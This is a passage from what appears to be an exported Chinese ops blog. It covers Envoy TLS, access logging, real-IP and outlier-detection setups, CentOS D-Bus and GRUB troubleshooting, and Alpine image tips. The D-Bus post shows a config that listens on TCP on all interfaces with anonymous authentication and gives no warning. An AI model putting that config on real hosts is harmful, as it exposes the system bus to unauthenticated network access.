prefix: \u0026quot;/\u0026quot; } route: cluster: service_gray http_filters: - name: envoy.router access_log: - name: envoy.listener.accesslog typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog path: /dev/stdout log_format: text_format: \u0026quot;[%START_TIME%] \\\u0026quot;%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%\\\u0026quot; %RESPONSE_CODE% %RESPONSE_FLAGS% %BYTES_RECEIVED% %BYTES_SENT% %DURATION% %RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)% \\\u0026quot;%REQ(X-FORWARDED-FOR)%\\\u0026quot; \\\u0026quot;%REQ(USER-AGENT)%\\\u0026quot; \\\u0026quot;%REQ(X-REQUEST-ID)%\\\u0026quot; \\\u0026quot;%REQ(:AUTHORITY)%\\\u0026quot; \\\u0026quot;%UPSTREAM_HOST%\\\u0026quot;\\n\u0026quot; transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext common_tls_context: tls_certificates: certificate_chain: filename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/server.key\u0026quot; validation_context: trusted_ca: filename: \u0026quot;/etc/envoy/ca/ca.crt\u0026quot; require_client_certificate: true clusters: - name: service_gray connect_timeout: 0.25s type: strict_dns lb_policy: round_robin load_assignment: cluster_name: service_gray endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: 127.0.0.1, port_value: 90 } service red admin: access_log_path: \u0026quot;/dev/null\u0026quot; address: socket_address: address: 0.0.0.0 port_value: 9901 static_resources: listeners: - name: listener_https address: socket_address: { address: 0.0.0.0, port_value: 443 } filter_chains: - filters: - name: envoy.http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_https codec_type: AUTO route_config: name: https_route virtual_hosts: - name: https_route domains: [\u0026quot;*\u0026quot;] routes: - match: { prefix: \u0026quot;/\u0026quot; } route: cluster: service_red http_filters: - name: envoy.router access_log: - name: envoy.listener.accesslog typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog path: /dev/stdout log_format: text_format: \u0026quot;[%START_TIME%] \\\u0026quot;%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%\\\u0026quot; %RESPONSE_CODE% %RESPONSE_FLAGS% %BYTES_RECEIVED% %BYTES_SENT% %DURATION% %RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)% \\\u0026quot;%REQ(X-FORWARDED-FOR)%\\\u0026quot; \\\u0026quot;%REQ(USER-AGENT)%\\\u0026quot; \\\u0026quot;%REQ(X-REQUEST-ID)%\\\u0026quot; \\\u0026quot;%REQ(:AUTHORITY)%\\\u0026quot; \\\u0026quot;%UPSTREAM_HOST%\\\u0026quot;\\n\u0026quot; transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext common_tls_context: tls_certificates: - certificate_chain: filename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/server.key\u0026quot; clusters: - name: service_red connect_timeout: 0.25s type: strict_dns lb_policy: round_robin load_assignment: cluster_name: service_red endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: 127.0.0.1, port_value: 90 } 配置说明 docker-compose\nnetwork_mode: \u0026quot;service:webserver1\u0026quot; 指定网络类型，使envoy和后端程序运行在一个网络下\nsecrets: - name: servers tls_certificate: certificate_chain: filename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/server.key\u0026quot; - name: clients tls_certificate: certificate_chain: filename: \u0026quot;/etc/envoy/certs/client.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/client.key\u0026quot; - name: validation validation_context: trusted_ca: filename: \u0026quot;/etc/envoy/ca/ca.crt\u0026quot; server\ntransport_socket: name: envoy.transport_sockets.tls typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext common_tls_context: tls_certificates: certificate_chain: filename: \u0026quot;/etc/envoy/certs/server.crt\u0026quot; private_key: filename: \u0026quot;/etc/envoy/certs/server.key\u0026quot; validation_context: # 验证机制的相关配置 trusted_ca: # 信任的ca证书，未指定时不会验证对端证书 filename: \u0026quot;/etc/envoy/ca/ca.crt\u0026quot; # 这里指定的为根ca require_client_certificate: true # boolval 设置为ture,Envoy将拒绝没有有效客户端证书的连接。 验证结果 /gray/colorful后端服务开启了验证客户端ca，访问报错，后端程序并没收到请求，因证书无效，envoy销毁了请求 将根ca设置为可信任后 /red/colorful 没开启验证客户端证书\n","permalink":"https://www.oomkill.com/2020/09/envoy-mutual-tls/","summary":"","title":"Envoy：TLS双向认证"},{"content":"Authorization not available. Check if polkit Authorization not available. Check if polkit service is running or see debug message for more information. dbus.socket failed to listen on sockets: Address family not supported by protocol Failed to listen on D-Bus System Message Bus Socket. 这个问题是因为dbus.socket状态异常，所有依赖dbus的启动都会去通过systemcall连接 dbus，当服务不可用时，所有服务无法以systemd方式正常启动/关闭。需要检查dbus.socket是否正常。本地使用需保证unix套接字的监听时启动的\nDid not receive a reply Failed to open connection to \u0026quot;system\u0026quot; message bus: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken. 这是因为你的配置不对，客户端无法连接上\nD-Bus 重启后登陆慢 systemd-logind: Failed to connect to system bus: Connection refused systemd-logind: Failed to fully start up daemon: Connection refused systemd: systemd-logind.service: main process exited, code=exited, status=1/FAILURE systemd: Unit systemd-logind.service entered failed state. systemd: systemd-logind.service failed. systemd: systemd-logind.service has no holdoff time, scheduling restart. systemd: start request repeated too quickly for systemd-logind.service systemd: Unit systemd-logind.service entered failed state. systemd: systemd-logind.service failed. dbus[7782]: [system] Failed to activate service 'org.freedesktop.login1': timed out dbus-daemon: dbus[7782]: [system] Failed to activate service 'org.freedesktop.login1': timed out 参考：ssh登陆缓慢\nsystemd-logind主要功能是为每一个登陆session创建一个systemd角度的cgroup管理对象，更方便对session使用cgroup，在dbus服务异常时，systemd-logind会导致登陆缓慢，并不影响正常登陆和ssh登陆。重启dbus.socket后需要也重启systemd-logind\nD-Bus 开启远程连接 编辑 /usr/share/dbus-1/system.conf 或 /etc/dbus-1/session.conf\n通常情况下生效的是 /etc/dbus-1/system.conf ,需要根据dbus应用是system bus 还是 session bus进行选择配置\n\u0026lt;listen\u0026gt;tcp:host=\u0026lt;ip\u0026gt;,bind=*,port=\u0026lt;port\u0026gt;,family=ipv4\u0026lt;/listen\u0026gt; \u0026lt;listen\u0026gt;unix:path=/run/user/\u0026lt;username\u0026gt;/dbus/user_bus_socket\u0026lt;/listen\u0026gt; \u0026lt;listen\u0026gt;unix:tmpdir=/tmp\u0026lt;/listen\u0026gt; \u0026lt;auth\u0026gt;ANONYMOUS\u0026lt;/auth\u0026gt; \u0026lt;allow_anonymous/\u0026gt; Reference dbus-send使用 Linux DBus远程TCP连接失败 dbus faq faq ","permalink":"https://www.oomkill.com/2020/09/centos7-dbus-troubleshooting/","summary":"","title":"Centos7 dbus问题总结"},{"content":" access_log: - name: envoy.listener.accesslog typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog path: /var/log/envoy.log log_format: text_format: \u0026quot;[%START_TIME%] \\\u0026quot;%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%\\\u0026quot; %RESPONSE_CODE% %RESPONSE_FLAGS% %BYTES_RECEIVED% %BYTES_SENT% %DURATION% %RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)% \\\u0026quot;%REQ(X-FORWARDED-FOR)%\\\u0026quot; \\\u0026quot;%REQ(USER-AGENT)%\\\u0026quot; \\\u0026quot;%REQ(X-REQUEST-ID)%\\\u0026quot; \\\u0026quot;%REQ(:AUTHORITY)%\\\u0026quot; \\\u0026quot;%UPSTREAM_HOST%\\\u0026quot;\\n\u0026quot; ","permalink":"https://www.oomkill.com/2020/09/envoy-access-log/","summary":"","title":"Envoy开启访问日志 access_log"},{"content":"在envoy作为前端代理时，用户ip的获取很重要，一般获取ip的方式。都是通过Header中的 X-Forward-For、 X-Real-IP或 Remote addr 等属性获取，但是如果确保Envoy可以获取到的ip是真实的用户ip呢？本篇继续解密！\n概念说明 Remote Address 是nginx与客户端进行TCP连接过程中，获得的客户端真实地址。Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。 一般情况下，在Envoy作为最外层代理时，此IP为真实的IP客户端IP\nX-Real-IP 是一个自定义头。X-Real-Ip 通常被 HTTP 代理用来表示与它产生 TCP 连接的设备 IP，这个设备可能是其他代理，也可能是真正的请求端。X-Real-Ip 目前并不属于任何标准，代理和 Web 应用之间可以约定用任何自定义头来传递这个信息。\nX-Forwarded-For X-Forwarded-For 是一个扩展头。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP，现在已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中。通常，X-Forwarded-For可被伪造，并且使用CDN会被重写\nEnvoy中如何获取真实IP 在Envoy中，涉及到客户端IP的配置如下： use_remote_address： 默认值false，设置为true，使用客户端连接的真实远程地址，false是使用x-forwarded-for skip_xff_append： 设置为true，则不会将远程地址附加到x-forwarded-for中 request_headers_to_add 添加请求头 request_headers_to_remove 删除一个请求头\n实验环境配置准备 admin: access_log_path: /dev/null address: socket_address: { address: 0.0.0.0, port_value: 9901 } static_resources: listeners: - name: listener_80 address: socket_address: { address: 0.0.0.0, port_value: 80 } access_log: filter_chains: - filters: - name: envoy_http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager access_log: - name: envoy.listener.accesslog typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog path: /var/log/envoy.log log_format: text_format: \u0026quot;[%START_TIME%] \\\u0026quot;%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%\\\u0026quot; %RESPONSE_CODE% %RESPONSE_FLAGS% %BYTES_RECEIVED% %BYTES_SENT% %DURATION% %RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)% \\\u0026quot;%REQ(X-FORWARDED-FOR)%\\\u0026quot; \\\u0026quot;%REQ(USER-AGENT)%\\\u0026quot; \\\u0026quot;%REQ(X-REQUEST-ID)%\\\u0026quot; \\\u0026quot;%REQ(:AUTHORITY)%\\\u0026quot; \\\u0026quot;%UPSTREAM_HOST%\\\u0026quot;\\n\u0026quot; http_filters: - name: envoy.filters.http.router use_remote_address: true skip_xff_append: false xff_num_trusted_hops: 0 stat_prefix: local_route codec_type: AUTO route_config: name: local_route #request_headers_to_remove: \u0026quot;X-Forwarded-For\u0026quot; request_headers_to_add: header: key: \u0026quot;X-Forwarded-For\u0026quot; value: \u0026quot;%DOWNSTREAM_REMOTE_ADDRESS_WITHOUT_PORT%\u0026quot; #value: \u0026quot;%REQ(REMOTE_ADDR)%\u0026quot; append: true virtual_hosts: - name: split_traffic domains: [ \u0026quot;*\u0026quot; ] routes: - match: prefix: \u0026quot;/\u0026quot; route: cluster: version_v1 request_mirror_policies: cluster: version_v2 runtime_fraction: default_value: numerator: 10 denominator: HUNDRED runtime_key: routing.request_mirror.version clusters: - name: version_v1 connect_timeout: 0.25s type: STRICT_DNS lb_policy: ROUND_ROBIN load_assignment: cluster_name: version_v1 endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: version1, port_value: 90 } health_checks: timeout: 3s interval: 30s unhealthy_threshold: 2 healthy_threshold: 2 http_health_check: path: /ping expected_statuses: { start: 200, end: 201 } - name: version_v2 connect_timeout: 0.25s type: STRICT_DNS lb_policy: ROUND_ROBIN load_assignment: cluster_name: version_v2 endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: version2, port_value: 90 } health_checks: timeout: 3s interval: 30s unhealthy_threshold: 2 healthy_threshold: 2 http_health_check: path: /ping expected_statuses: { start: 200, end: 201 } docker-compose\nversion: '3' services: envoy: image: envoyproxy/envoy-alpine:v1.15-latest environment: - ENVOY_UID=0 ports: - 80:80 - 443:443 - 82:9901 volumes: - ./envoy.yaml:/etc/envoy/envoy.yaml networks: envoymesh: aliases: - envoy depends_on: - webserver1 - webserver2 - webserver3 - webserver4 webserver1: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - version1 environment: - VERSION=v1 - COLORFUL=blue expose: - 90 webserver2: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - version1 environment: - VERSION=v1 - COLORFUL=blue expose: - 90 webserver3: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - version2 environment: - VERSION=v2 - COLORFUL=red expose: - 90 webserver4: image: cylonchau/envoy-end:latest environment: - VERSION=v2 - COLORFUL=red networks: envoymesh: aliases: - version2 expose: - 90 networks: envoymesh: {} 实际使用Envoy作为代理时的外在环境 环境1：客户端直接和Envoy通信 当一个正常请求时，此处可以正常获得客户端IP，实际上envoy拿的值是 X-Forwarded-For\n后端日志\n在伪造或者重写X-Forwarded-For后实际上是获取的伪造的值。\n在Envoy直接作为外层代理时，可以使用如下参数，在不管如何伪造，都可以拿到对应的参数。\nname: local_route request_headers_to_remove: \u0026quot;X-Forwarded-For\u0026quot; # 怕X-Forwarded-For为伪造值，可以删除此值， request_headers_to_add: # 删除后还需要向后端传递，故还需要添加上此值 header: key: \u0026quot;X-Forwarded-For\u0026quot; value: \u0026quot;%DOWNSTREAM_REMOTE_ADDRESS_WITHOUT_PORT%\u0026quot; # 获取 remote_addr，此值无法伪造,为Envoy变量，表示 下游主机真实IP不加端口，即remote_addr 无端口 append: true # 表面值是追加还是重写 可以看到envoy获取的为真实的ip并非伪造的请求\n环境2：Envoy前段存在代理（无CDN） 此环境下，前端存在代理，如f5、nginx等。这种情况下不能使用remote_addr 这样获取的为前端代理的IP并非真实IP\n前端存在f5或nginx，可以在f5中配置irule传递真实的remote_addr，替换为真实的客户端IP，又前端代理重写配置，可自定义值。\nrequest_headers_to_remove: \u0026quot;X-Forwarded-For\u0026quot; request_headers_to_add: header: key: \u0026quot;X-Forwarded-For\u0026quot; value: \u0026quot;%REQ(custom_header)%\u0026quot; 环境3：Envoy前段存在代理（单CDN） 此环境下，前端存在代理，并且使用了CDN，应为每个CDN厂商获取客户真实IP的方式并不一致，这里需要找到cdn厂商找到获取真实IP的方法，在按照步骤2进行。\n举例：\n阿里云cdn获取真实IP方法\n加速乐获取真实IP方法\n环境4：Envoy前段存在代理（多CDN） 由于各CDN的带宽、价格、使用场景等因素，在实际情况下，可能使用多种CDN；如：正常情况下使用cdn加速，遇到攻击时切换安全防御高的CDN。一般仅加速的CDN价格比带防御的要便宜很多。\n此处Enovy待更新，后端应用可根据CDN的http头正常获取IP\n环境5：内部代理 无特殊需求可无需配置\n","permalink":"https://www.oomkill.com/2020/09/envoy-real-ip/","summary":"","title":"记录经过envoy代理后获取客户端真实IP"},{"content":"作为go应用存在二进制文件却不能执行 明明镜像中有对应的二进制文件，但是执行时却提示 not found 或 no such file 或 standard_init_linux.go:211: exec user process caused \u0026quot;no such file or directory\u0026quot;\n网上常说都是因为windows换行符编码问题。此处实际问题是该二进制文件是使用动态链接方式编译.\n解决方法：\nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build --ldflags \u0026quot;-extldflags -static\u0026quot; 注意：CGO_ENABLED=0 GOOS=linux GOARCH=amd64 和 cgo_enabled=0 goos=linux goarch=amd64 是有区别的。\n保存信息\n诸如此类信息都是上述问题\nstandard_init_linux.go:211: exec user process caused \u0026quot;no such file or directory\u0026quot; /tmp # ./envoy_end /bin/sh: ./envoy_end: not found 替换为国内源 RUN sed -i 's@http://dl-cdn.alpinelinux.org/@https://mirrors.aliyun.com/@g' /etc/apk/repositories 基于alpine制作PHP镜像 alpine包搜索 https://pkgs.alpinelinux.org/\n安装依赖库 apk add --no-cache xxx\n基于php apline镜像自行增加或删除扩展。 offcial-repo\n增加扩展可以使用 pecl install xxx 如 pecl install redis\n如果不能使用此种方法安装可以使用，git clone 下来在进行编译，编译成功后 docker-php-ext-enable xxx启动扩展。\n此中方式制作镜像，常见扩展安装完成后，容器大小可控制在100M左右\n参考资料：What is .build-deps for apk add \u0026ndash;virtual command?\n","permalink":"https://www.oomkill.com/2020/09/alpine-trouble-q-and-a/","summary":"","title":"使用alpine为基础镜像Q\u0026A"},{"content":"CentOS7 / CentOS8 设置终端屏幕分辨率 Centos7 修改文件 /boot/grub2/grub.cfg\n搜索 linux16\nvmlinuz-3.10.0-123.el7.x86_64 root=UUID=881ac4e6-4a55-47b1-b864-555de7051763 ro rd.lvm.lv=centos/swap vconsole.font=latarcyrheb-sun16 rd.lvm.lv=centos/root crashkernel=auto vconsole.keymap=us rhgb quiet LANG=en_US.UTF-8\r添加如下,???具体看下表\nvga=0x???\rvga=0x340\rCentOS 8 CentOS8 使用了 blsgcfg来解析文件生成菜单项。菜单项配置文件在/boot/loader/entries/下，每一个文件表示一个启动项。\n这里需要修改启动项的参数，这里修改options，实际上是修改了 /boot/grub2/grubenv对应的值。\noptions $kernelopts $tuned_params\r可以直接修改/etc/sysconfig/grub中的GRUB_CMDLINE_LINUX值后增加=加vga=0x??? （对照分辨率表修改???）。\n修改完成后执行 grub2-mkconfig -o /boot/grub2/grub.cfg 重启即修改了/boot/grub2/grubenv对应的值。\ncentos7 启动引导顺序 查看默认启动项 grub2-editenv list 查看启动项列表 awk -F\\' '$1==\u0026quot;menuentry \u0026quot; {print $2}' /etc/grub2.cfg 设置默认引导 grub2-set-default 'Windows 10' 设置默认启动项 grub2-set-default 2 需要按照启动项列表顺序 重新生成grub2.cfg grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg 修改对应配置 cat /etc/default/grub centos7 精简开机自启动 centos7 精简开机自启动\nntsysv rsyslog crond sshd network\n","permalink":"https://www.oomkill.com/2020/09/centos-configration/","summary":"","title":"centos配置"},{"content":"outlier detection 在异常检测领域中，常常需要决定新观察的点是否属于与现有观察点相同的分布（则它称为inlier），或者被认为是不同的（称为outlier）。离群是异常的数据，但是不一定是错误的数据点。\n在Envoy中，离群点检测是动态确定上游集群中是否有某些主机表现不正常，然后将它们从正常的负载均衡集群中删除的过程。outlier detection可以与healthy check同时/独立启用，并构成整个上游运行状况检查解决方案的基础。\n此处概念不做过多的说明，具体可以参考官方文档与自行google\n监测类型 连续的5xx 连续的网关错误 连续的本地来源错误 更多介绍参考官方文档 outlier detection\n离群检测测试 说明，此处只能在单机环境测试更多还的参考与实际环境\n环境准备 docker-compose 模拟后端5个节点\nversion: '3' services: envoy: image: envoyproxy/envoy-alpine:v1.15-latest environment: - ENVOY_UID=0 ports: - 80:80 - 443:443 - 82:9901 volumes: - ./envoy.yaml:/etc/envoy/envoy.yaml networks: envoymesh: aliases: - envoy depends_on: - webserver1 - webserver2 webserver1: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - myservice - webservice expose: - 90 webserver2: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - myservice - webservice expose: - 90 webserver3: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - myservice - webservice expose: - 90 webserver4: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - myservice - webservice expose: - 90 webserver5: image: cylonchau/envoy-end:latest networks: envoymesh: aliases: - myservice - webservice expose: - 90 networks: envoymesh: {} envoy 配置文件\nadmin: access_log_path: /dev/null address: socket_address: { address: 0.0.0.0, port_value: 9901 } static_resources: listeners: - name: listener_0 address: socket_address: { address: 0.0.0.0, port_value: 80 } filter_chains: - filters: - name: envoy_http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_http codec_type: AUTO route_config: name: local_route virtual_hosts: - name: local_service domains: [ \u0026quot;*\u0026quot; ] routes: - match: { prefix: \u0026quot;/\u0026quot; } route: { cluster: local_service } http_filters: - name: envoy.filters.http.router clusters: - name: local_service connect_timeout: 0.25s type: STRICT_DNS lb_policy: ROUND_ROBIN load_assignment: cluster_name: local_service endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: webservice, port_value: 90 } health_checks: timeout: 3s interval: 90s unhealthy_threshold: 5 healthy_threshold: 5 no_traffic_interval: 240s http_health_check: path: \u0026quot;/ping\u0026quot; expected_statuses: start: 200 end: 201 outlier_detection: consecutive_5xx: 2 base_ejection_time: 30s max_ejection_percent: 40 interval: 20s success_rate_minimum_hosts: 5 success_rate_request_volume: 10 配置说明 outlier_detection: consecutive_5xx: 2 # 连续的5xx错误数量 base_ejection_time: 30s # 弹出主机的基准时间。实际时间等于基本时间乘以主机弹出的次数 max_ejection_percent: 40 # 可弹出主机集群的最大比例，默认值为10% ，此处为40% 即集群中5个节点的2个节点 interval: 20s # 间隔时间 success_rate_minimum_hosts: 5 # 集群中最小主机数量 success_rate_request_volume: 10 # 在一个时间间隔内中收集请求检测的最小数量 此处为了效果，将主动检测状态时间增加，主机弹出时间增加\n路由 /502bad 模拟一个502的错误\n运行结果 模拟一些5xx请求和200请求\nworkers envoy_1 | [2020-09-13 06:10:01.093][1][warning][main] [source/server/server.cc:537] there is no configured limit to the number of allowed active connections. Set a limit via the runtime key overload.global_downstream_max_connections webserver2_1 | [GIN] 2020/09/13 - 06:10:08 | 200 | 63.272?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver5_1 | [GIN] 2020/09/13 - 06:10:10 | 200 | 46.732?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 06:10:11 | 200 | 45.43?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver3_1 | [GIN] 2020/09/13 - 06:10:13 | 502 | 43.858?s | 172.22.0.7 | GET \u0026quot;/502bad\u0026quot; webserver4_1 | [GIN] 2020/09/13 - 06:10:14 | 502 | 47.486?s | 172.22.0.7 | GET \u0026quot;/502bad\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 06:10:15 | 200 | 15.691?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver5_1 | [GIN] 2020/09/13 - 06:10:16 | 200 | 14.719?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 06:10:16 | 200 | 15.758?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver3_1 | [GIN] 2020/09/13 - 06:10:17 | 502 | 15.697?s | 172.22.0.7 | GET \u0026quot;/502bad\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 06:10:17 | 502 | 14.002?s | 172.22.0.7 | GET \u0026quot;/502bad\u0026quot; webserver5_1 | [GIN] 2020/09/13 - 06:10:17 | 502 | 14.913?s | 172.22.0.7 | GET \u0026quot;/502bad\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 06:10:18 | 502 | 14.911?s | 172.22.0.7 | GET \u0026quot;/502bad\u0026quot; webserver4_1 | [GIN] 2020/09/13 - 06:10:18 | 502 | 30.429?s | 172.22.0.7 | GET \u0026quot;/502bad\u0026quot; webserver5_1 | [GIN] 2020/09/13 - 06:10:19 | 200 | 14.377?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 06:10:19 | 200 | 14.861?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 06:10:19 | 200 | 18.924?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver5_1 | [GIN] 2020/09/13 - 06:10:19 | 200 | 15.899?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 06:10:19 | 200 | 24.849?s | 172.22.0.7 | GET \u0026quot;/\u0026quot; 集群已弹出 20%的节点，健康检查结果为 failed_outlier_check\n请求已分配到其余三台节点\n30秒后，弹出主机已回复正常\n再次模拟请求\n30秒后，如在时间间隔内，无新增请求，节点依旧为 failed_outlier_check，有新增请求时恢复。\n","permalink":"https://www.oomkill.com/2020/09/outlier-detection/","summary":"","title":"Envoy 离群检测"},{"content":"实验文件 docker-compose\nversion: '3' services: envoy: image: envoyproxy/envoy-alpine:v1.15-latest environment: - ENVOY_UID=0 - HEALTHY=ok ports: - 80:80 - 443:443 - 82:9901 volumes: - ./envoy.yaml:/etc/envoy/envoy.yaml - ./certs:/etc/envoy/certs networks: envoymesh: aliases: - envoy depends_on: - webserver1 - webserver2 webserver1: image: cylonchau/envoy-end:latest environment: - COLORFUL=blue - HEALTHY=ok networks: envoymesh: aliases: - myservice - webservice expose: - 90 webserver2: image: cylonchau/envoy-end:latest environment: - COLORFUL=blue networks: envoymesh: aliases: - myservice - webservice expose: - 90 networks: envoymesh: {} envoy配置文件\nadmin: access_log_path: /dev/null address: socket_address: { address: 0.0.0.0, port_value: 9901 } static_resources: listeners: - name: listener_0 address: socket_address: { address: 0.0.0.0, port_value: 80 } filter_chains: - filters: - name: envoy_http_connection_manager typed_config: \u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_http codec_type: AUTO route_config: name: local_route virtual_hosts: - name: local_service domains: [ \u0026quot;*\u0026quot; ] routes: - match: { prefix: \u0026quot;/\u0026quot; } route: { cluster: local_service } http_filters: - name: envoy.filters.http.router clusters: - name: local_service connect_timeout: 0.25s type: STRICT_DNS lb_policy: ROUND_ROBIN load_assignment: cluster_name: local_service endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: webservice, port_value: 90 } health_checks: timeout: 1s interval: 10s unhealthy_threshold: 5 healthy_threshold: 5 http_health_check: path: \u0026quot;/ping\u0026quot; expected_statuses: start: 200 end: 201 路由 /ping 健康监测的路由 /ping/ok 手动将节点设置为有效节点 /ping/fail 手动将节点设置为失效\n测试结论 $ curl -s 127.0.0.1:82/clusters|grep health local_service::172.22.0.2:90::health_flags::healthy local_service::172.22.0.3:90::health_flags::healthy 当在集群启动时，所有节点默认为健康状态，在没有流量进入时，默认的间隔时间为1分钟。\n当有外部流量进入后，在结束上个默认间隔1分钟之后，会成为配置文件设置的默认10s\n手动设置一个节点为不健康状态，\n日志中可以看出，在手动设置为失效时，请求是不会到达后端失效节点，并且第一次请求时间明显长，在设置为成功时，后端节点判定为健康是在4次健康监测而非正常请求\nwebserver1_1 | [GIN] 2020/09/13 - 02:00:48 | 200 | 110.706µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:00:48 | 200 | 47.29µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:00:49 | 200 | 14.909µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:01:18 | 200 | 58.53µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:01:19 | 200 | 15.988µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:01:42 | 200 | 20.844µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:01:42 | 200 | 12.247µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:01:52 | 200 | 38.892µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:01:52 | 200 | 32.254µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:01:54 | 200 | 33.689µs | ::1 | GET \u0026quot;/ping/fail\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:01:59 | 200 | 82.86µs | ::1 | GET \u0026quot;/ping/fail\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:02 | 200 | 155.202µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver2_1 | [GIN] 2020/09/13 - 02:02:02 | 502 | 26.73µs | 172.22.0.4 | GET \u0026quot;/ping\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:07 | 200 | 19.193µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:08 | 200 | 14.651µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:09 | 200 | 15.101µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:09 | 200 | 15.294µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:10 | 200 | 26.45µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:10 | 200 | 17.679µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; webserver1_1 | [GIN] 2020/09/13 - 02:02:11 | 200 | 14.703µs | 172.22.0.4 | GET \u0026quot;/\u0026quot; 